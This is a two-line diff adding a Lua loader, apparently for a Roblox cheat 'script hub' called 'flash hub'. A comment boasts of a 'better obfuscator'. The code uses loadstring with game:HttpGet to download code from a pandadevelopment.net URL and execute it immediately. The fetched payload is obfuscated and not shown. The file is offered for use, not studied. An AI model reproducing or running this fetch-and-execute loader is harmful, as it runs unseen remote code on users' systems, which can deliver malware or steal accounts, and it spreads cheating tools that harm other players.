@@ -1,0 +1,2 @@
+-- i found a better obfuscator, so heres flash hub!
+loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/601509f4bfe24b09"))()
